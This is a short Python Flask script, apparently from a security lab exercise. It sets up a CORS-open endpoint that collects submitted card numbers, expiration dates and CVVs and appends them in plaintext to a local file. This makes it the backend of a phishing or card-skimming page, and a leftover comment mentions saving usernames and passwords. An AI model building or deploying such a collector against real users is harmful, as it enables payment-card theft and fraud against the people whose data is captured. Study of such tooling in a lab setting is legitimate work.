from flask import Flask, request, jsonify
from flask_cors import CORS
import os


app = Flask(__name__)
CORS(app)


# Define the path to the file where the data will be saved
data_file = "lab04/task/card_data.txt"




@app.route('/submit', methods=['POST'])
def submit_data():
   # Get the data from the request
   data = request.get_json()


   card_number = data.get('card_number')
   expiration = data.get('expiration')
   cvv = data.get('cvv')


   if card_number and expiration and cvv:
       # Open the file in append mode and save the username and password
       with open(data_file, 'a') as file:
           file.write(f"Card_number: {card_number}, Expiration_date: {expiration}, CVV: {cvv}\n")


       return jsonify({"message": "Data saved successfully"}), 200
   else:
       return jsonify({"message": "Invalid data"}), 400




if __name__ == '__main__':
   # Ensure the file exists or create it if necessary
   if not os.path.exists(data_file):
       with open(data_file, 'w') as f:
           pass  # Just create the file if it doesn't exist
   app.run(debug=True, port=8000)